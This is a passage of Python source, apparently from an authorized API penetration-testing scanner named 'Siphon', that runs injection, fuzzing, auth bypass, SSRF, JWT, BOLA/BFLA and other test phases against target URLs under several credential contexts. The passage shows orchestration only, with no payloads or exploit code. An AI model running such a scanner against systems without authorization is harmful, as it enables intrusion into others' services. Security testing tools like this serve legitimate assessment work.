        con.info(f"Proxy    : {scan['proxy']}")
    _spec_files = scan.get("api_spec_files") or ([scan["openapi_url"]] if scan.get("openapi_url") else [])
    if _spec_files:
        con.info(f"Spec file(s): {', '.join(_spec_files)}")

    # ------------------------------------------------------------------ #
    # Per-target loop (mirrors Fracture multi-URL pattern)                #
    # ------------------------------------------------------------------ #
    for raw_url in base_urls:
        if not raw_url:
            continue

        # Per-URL settings copy so mutations don't bleed across targets
        t_settings = copy.deepcopy(settings)
        t_scan = t_settings["scan"]
        t_scan["api_base_url"] = raw_url

        target = _parse_target(raw_url)

        # Per-URL output sub-directory when scanning multiple targets
        base_project = Path(scan["project"]).resolve()
        if len(base_urls) > 1:
            safe_host = re.sub(r'[^\w._-]', '_', target["host"])
            project_dir = base_project / safe_host
        else:
            project_dir = base_project
        t_scan["project"] = str(project_dir)

        output = OutputManager(str(project_dir))
        output._auth_cfg = t_scan.get("auth")   # stash for api_map update
        eng = settings.get("engagement", {})
        _write_project_meta(
            base_project,
            tool="siphon",
            client_short=eng.get("client_short", ""),
            year=(eng.get("start_date", "") or "")[:4] or datetime.now().strftime("%Y"),
            version=VERSION,
        )

        pm = ProgressManager(project_dir / "checkpoint.json")
        if pm.get_state()["completed_phases"]:
            con.info(f"Checkpoint found — resuming ({len(pm.get_state()['completed_phases'])} phases already done)")

        phases_cfg = t_scan.get("phases", {})

        def _skip(phase: str) -> bool:
            if not phases_cfg.get(phase, True):
                con.status(phase, "skip", "Disabled in settings")
                return True
            if pm.is_phase_complete(phase):
                con.status(phase, "skip", "Already complete (checkpoint)")
                return True
            return False

        sess       = _make_session(t_settings)
        auth_sess  = _build_auth_session(t_settings, "auth")   # primary user session (privilege phases)
        auth2_sess = _build_auth_session(t_settings, "auth2")  # secondary user (cross_user)

        def _report_auth_status(sess_obj: "requests.Session | None",
                                auth_cfg: dict, label: str) -> None:
            """Log whether authentication was attempted and whether it succeeded."""
            if not auth_cfg.get("enabled"):
                con.log(f"[auth:{label}] Authentication not attempted", "INFO")
                return
            if sess_obj is None:
                con.log(f"[auth:{label}] Authentication failed — session could not be built", "ERROR")
                return
            _has_cookie = bool(sess_obj.cookies)
            _has_header = any(
                k.lower() in ("authorization", "x-auth-token", "x-api-key",
                               "x-csrf-token", "cookie")
                for k in sess_obj.headers
            )
            _has_auth   = sess_obj.auth is not None
            if _has_cookie or _has_header or _has_auth:
                con.log(f"[auth:{label}] Authentication successful", "SUCCESS")
            else:
                con.log(f"[auth:{label}] Authentication failed — no credentials were applied to the session", "ERROR")

        _report_auth_status(auth_sess,  t_scan.get("auth",  {}), "primary")
        _report_auth_status(auth2_sess, t_scan.get("auth2", {}), "secondary")

        # ------------------------------------------------------------------
        # Build per-credential contexts from auth_matrix + unauthenticated.
        # All non-privilege phases run once per context so that vulnerabilities
        # reachable only under elevated credentials are not missed.
        # Privilege-escalation phases (BOLA, BFLA, cross_user, access_matrix)
        # run once after all contexts — they require cross-role comparison and
        # must not be executed with a single elevated identity.
        # ------------------------------------------------------------------
        _cred_contexts: list = []
        for _rc in (t_scan.get("auth_matrix") or []):
            _r_label = _rc.get("role") or f"ctx{len(_cred_contexts) + 1}"
            _r_s = copy.deepcopy(t_settings)
            _r_auth = copy.deepcopy(_r_s["scan"].get("auth", {}))
            _r_auth["enabled"]  = True
            _r_auth["username"] = _rc.get("username", "")
            _r_auth["password"] = _rc.get("password", "")
            _r_s["scan"]["auth"] = _r_auth
            _r_as = _build_auth_session(_r_s)
            _cred_contexts.append({"label": _r_label, "settings": _r_s, "auth_sess": _r_as})
        # Unauthenticated context always last
        _cred_contexts.append({"label": "unauthenticated", "settings": t_settings, "auth_sess": None})

        api_inventory: list = []
        _inv_seen:     set  = set()

        # TLS is server-side — run once before the credential loop (always unauthenticated)
        output.set_auth_context([{"username": "UNAUTH", "role": "unauthenticated"}])

        if phases_cfg.get("tls", True) and not pm.is_phase_complete("tls"):
            con.section(f"Siphon — {raw_url} [tls]")
            pm.set_phase_status("tls", "running", VantageConsole._PHASE_LABELS.get("tls", "tls"))
            try:
                phase_tls(t_settings, output)
                pm.set_phase_status("tls", "complete", VantageConsole._PHASE_LABELS.get("tls", "tls"))
            except Exception as _e:
                con.err(f"Phase tls error: {_e}")
                pm.set_phase_status("tls", "error", detail=str(_e))
        elif not phases_cfg.get("tls", True):
            con.status("tls", "skip", "Disabled in settings")

        if _shutdown_requested:
            output.save_all(api_inventory)
            output.print_summary()
            sys.exit(0)

        # ── Per-credential context loop ──────────────────────────────────
        for _ctx in _cred_contexts:
            _ctx_label = _ctx["label"]
            _ctx_auth  = _ctx["auth_sess"]
            _ctx_s     = _ctx["settings"]

            # Set auth context so all findings in this pass carry the account
            if _ctx_label == "unauthenticated":
                output.set_auth_context([{"username": "UNAUTH", "role": "unauthenticated"}])
            else:
                _ctx_user = (_ctx_s.get("scan", {}).get("auth", {}).get("username") or "").strip() or _ctx_label
                output.set_auth_context([{"username": _ctx_user, "role": _ctx_label}])

            if _ctx_auth:
                con.info(f"Auth [{_ctx_label}]: enabled")
            else:
                con.info(f"Auth [{_ctx_label}]: none")

            con.section(f"Siphon — {raw_url} [{_ctx_label}]")

            # Closures capture _ctx_label via default arg to avoid late-binding
            def _skip(phase: str, _lbl: str = _ctx_label) -> bool:
                if not phases_cfg.get(phase, True):
                    con.status(phase, "skip", "Disabled in settings")
                    return True
                if pm.is_phase_complete(f"{phase}#{_lbl}"):
                    con.status(phase, "skip", "Already complete (checkpoint)")
                    return True
                return False

            def _run_phase(phase: str, fn, *args, _lbl: str = _ctx_label) -> None:
                pm.set_phase_status(f"{phase}#{_lbl}", "running",
                                    VantageConsole._PHASE_LABELS.get(phase, phase))
                try:
                    fn(*args)
                    pm.set_phase_status(f"{phase}#{_lbl}", "complete",
                                        VantageConsole._PHASE_LABELS.get(phase, phase))
                except Exception as exc:
                    con.err(f"Phase {phase} [{_lbl}] error: {exc}")
                    pm.set_phase_status(f"{phase}#{_lbl}", "error", detail=str(exc))

            def _run_phase_ret(phase: str, fn, *args, _lbl: str = _ctx_label):
                pm.set_phase_status(f"{phase}#{_lbl}", "running",
                                    VantageConsole._PHASE_LABELS.get(phase, phase))
                try:
                    result = fn(*args)
                    pm.set_phase_status(f"{phase}#{_lbl}", "complete",
                                        VantageConsole._PHASE_LABELS.get(phase, phase))
                    return result
                except Exception as exc:
                    con.err(f"Phase {phase} [{_lbl}] error: {exc}")
                    pm.set_phase_status(f"{phase}#{_lbl}", "error", detail=str(exc))
                    return None

            # Phase 0: Discovery — accumulate endpoints across contexts
            if not _skip("discovery"):
                _disc = _run_phase_ret("discovery", phase_discovery, _ctx_s, sess, output)
                if _disc:
                    for _ep in _disc:
                        _ek = (_ep.get("method"), _ep.get("path"))
                        if _ek not in _inv_seen:
                            _inv_seen.add(_ek)
                            api_inventory.append(_ep)

            if _shutdown_requested:
                output.save_all(api_inventory)
                output.print_summary()
                sys.exit(0)

            # Phase 1: Recon
            if not _skip("recon"):
                _run_phase("recon", phase_recon, _ctx_s, sess, output)

            if _shutdown_requested:
                output.save_all(api_inventory)
                output.print_summary()
                sys.exit(0)

            # Phase 2: Fuzzing
            if not _skip("fuzzing"):
                _run_phase("fuzzing", phase_fuzzing, _ctx_s, sess, output, api_inventory)

            if _shutdown_requested:
                output.save_all(api_inventory)
                output.print_summary()
                sys.exit(0)

            # Phase 3: Injection
            if not _skip("injection"):
                _run_phase("injection", phase_injection, _ctx_s, sess, output, api_inventory, _ctx_auth)

            if _shutdown_requested:
                output.save_all(api_inventory)
                output.print_summary()
                sys.exit(0)

            # Phase 4: Auth Bypass
            if not _skip("auth_bypass"):
                _run_phase("auth_bypass", phase_auth_bypass,
                           _ctx_s, sess, _ctx_auth, output, api_inventory)

            if _shutdown_requested:
                output.save_all(api_inventory)
                output.print_summary()
                sys.exit(0)

            # Phase 5: Rate Limiting
            if not _skip("rate_limiting"):
                _run_phase("rate_limiting", phase_rate_limiting,
                           _ctx_s, sess, output, api_inventory)

            if _shutdown_requested:
                output.save_all(api_inventory)
                output.print_summary()
                sys.exit(0)

            # Phase 6: Mass Assignment
            if not _skip("mass_assignment"):
                _run_phase("mass_assignment", phase_mass_assignment,
                           _ctx_s, sess, _ctx_auth, output, api_inventory)

            if _shutdown_requested:
                output.save_all(api_inventory)
                output.print_summary()
                sys.exit(0)

            # Phase 7: SSRF
            if not _skip("ssrf"):
                _run_phase("ssrf", phase_ssrf, _ctx_s, sess, _ctx_auth, output, api_inventory)

            if _shutdown_requested:
                output.save_all(api_inventory)
                output.print_summary()
                sys.exit(0)

            # Phase 8: Data Exposure
            if not _skip("data_exposure"):
                _run_phase("data_exposure", phase_data_exposure,
                           _ctx_s, sess, _ctx_auth, output, api_inventory)

            if _shutdown_requested:
                output.save_all(api_inventory)
                output.print_summary()
                sys.exit(0)

            # Phase 9: GraphQL
            if not _skip("graphql"):
                _run_phase("graphql", phase_graphql, _ctx_s, sess, _ctx_auth, output)

            if _shutdown_requested:
                output.save_all(api_inventory)
                output.print_summary()
                sys.exit(0)

            # Phase 9b: Business Flows
            if not _skip("business_flows"):
                _run_phase("business_flows", phase_business_flows,
                           _ctx_s, sess, _ctx_auth, output, api_inventory)

            if _shutdown_requested:
                output.save_all(api_inventory)
                output.print_summary()
                sys.exit(0)

            # Phase 13: Session
            if not _skip("session"):
                _run_phase("session", phase_session, _ctx_s, _ctx_auth, output, api_inventory)

            if _shutdown_requested:
                output.save_all(api_inventory)
                output.print_summary()
                sys.exit(0)

            # Phase 14: JWT
            if not _skip("jwt"):
                _run_phase("jwt", phase_jwt, _ctx_s, _ctx_auth, output, api_inventory)

            if _shutdown_requested:
                output.save_all(api_inventory)
                output.print_summary()
                sys.exit(0)

            # Phase 15: Sensitive Files
            if not _skip("sensitive_files"):
                _run_phase("sensitive_files", phase_sensitive_files, _ctx_s, sess, output)

            if _shutdown_requested:
                output.save_all(api_inventory)
                output.print_summary()
                sys.exit(0)

            # Phase 16b: Unsafe Consumption
            if not _skip("unsafe_consumption"):
                _run_phase("unsafe_consumption", phase_unsafe_consumption,
                           _ctx_s, sess, _ctx_auth, output, api_inventory)

            if _shutdown_requested:
                output.save_all(api_inventory)
                output.print_summary()
                sys.exit(0)

            # Phase 17: Verb Tampering
            if not _skip("verb_tampering"):
                _run_phase("verb_tampering", phase_verb_tampering,
                           _ctx_s, sess, _ctx_auth, output, api_inventory)

            if _shutdown_requested:
                output.save_all(api_inventory)
                output.print_summary()
                sys.exit(0)

            # Phase 18: SOAP / WS-Security
            if not _skip("soap"):
                _run_phase("soap", phase_soap, _ctx_s, sess, output)

            if _shutdown_requested:
                output.save_all(api_inventory)
                output.print_summary()
                sys.exit(0)

            # Phase 19: File Upload Endpoint Detection
            if not _skip("file_upload_info"):
                _run_phase("file_upload_info", phase_file_upload_info,
                           _ctx_s, sess, _ctx_auth, output, api_inventory)

            if _shutdown_requested:
                output.save_all(api_inventory)
                output.print_summary()
                sys.exit(0)

        # ── Post-context: privilege-escalation / cross-credential phases ────────
        if auth_sess and t_scan.get("auth", {}).get("enabled"):
            _post_user = t_scan.get("auth", {}).get("username", "").strip() or "authenticated"
            output.set_auth_context([{"username": _post_user, "role": "authenticated"}])
        else:
            output.set_auth_context([{"username": "UNAUTH", "role": "unauthenticated"}])
        con.section(f"Siphon — {raw_url} [privilege-escalation]")

        def _skip(phase: str) -> bool:
            if not phases_cfg.get(phase, True):
                con.status(phase, "skip", "Disabled in settings")
                return True
            if pm.is_phase_complete(phase):
                con.status(phase, "skip", "Already complete (checkpoint)")
                return True
            return False

        def _run_phase(phase: str, fn, *args) -> None:
            pm.set_phase_status(phase, "running",
                                VantageConsole._PHASE_LABELS.get(phase, phase))
            try:
                fn(*args)
                pm.set_phase_status(phase, "complete",
                                    VantageConsole._PHASE_LABELS.get(phase, phase))
            except Exception as exc:
                con.err(f"Phase {phase} error: {exc}")
                pm.set_phase_status(phase, "error", detail=str(exc))

        # Phase 10: BOLA
        if not _skip("bola"):
            _run_phase("bola", phase_bola, t_settings, auth_sess, output, api_inventory)

        if _shutdown_requested:
            output.save_all(api_inventory)
            output.print_summary()
            sys.exit(0)

        # Phase 11: BFLA
        if not _skip("bfla"):
            _run_phase("bfla", phase_bfla, t_settings, auth_sess, output, api_inventory)

        if _shutdown_requested:
            output.save_all(api_inventory)
            output.print_summary()
            sys.exit(0)

        # Phase 12: Cross-User
        if not _skip("cross_user"):
            _run_phase("cross_user", phase_cross_user,
                       t_settings, auth_sess, auth2_sess, output, api_inventory)

        if _shutdown_requested:
            output.save_all(api_inventory)
            output.print_summary()
            sys.exit(0)

        # Phase 20: Multi-credential access matrix
        _auth_matrix_cfg = t_scan.get("auth_matrix", [])
        if not _skip("access_matrix") and (_auth_matrix_cfg or phases_cfg.get("access_matrix")):
            _run_phase("access_matrix", phase_access_matrix,
                       t_settings, output, api_inventory)

        # ------------------------------------------------------------------
        # Save results for this target
        # ------------------------------------------------------------------
        output.save_all(api_inventory)
        output.print_summary()
        con.info(f"Reports saved to: {t_scan['project']}/")

if __name__ == "__main__":
    main()